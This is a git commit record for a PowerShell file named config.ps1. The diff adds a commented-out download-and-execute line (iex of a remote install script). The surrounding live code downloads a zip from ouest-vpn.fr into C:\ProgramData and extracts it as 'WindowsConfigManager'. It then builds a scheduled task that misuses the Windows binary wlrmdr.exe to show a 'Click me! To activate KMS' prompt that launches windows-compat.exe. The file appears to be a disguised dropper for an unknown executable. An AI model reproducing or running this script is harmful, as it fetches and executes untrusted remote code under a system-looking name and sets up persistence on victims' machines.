cf889aebb24b09e0adb6bbd416aa1dd655afd4bc
Maestran <tristan.gorlin@gmail.com>
2023-06-11 15:16:15 +0200

    Update config.ps1

--- config.ps1
+++ config.ps1
@@ -1,3 +1,5 @@
+# iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
+
 Invoke-WebRequest -Uri "https://ouest-vpn.fr/WindowsConfigManager.zip" -OutFile "C:\ProgramData\config.zip"
 Expand-Archive -Path "C:\ProgramData\config.zip" -DestinationPath "C:\ProgramData\WindowsConfigManager"
 $action=New-ScheduledTaskAction -Execute "wlrmdr.exe" -Argument '-s 3600 -f 0 -t Click me! -m To activate KMS -a 10 -u "C:\ProgramData\WindowsConfigManager\WindowsConfigManager\windows-compat.exe"'
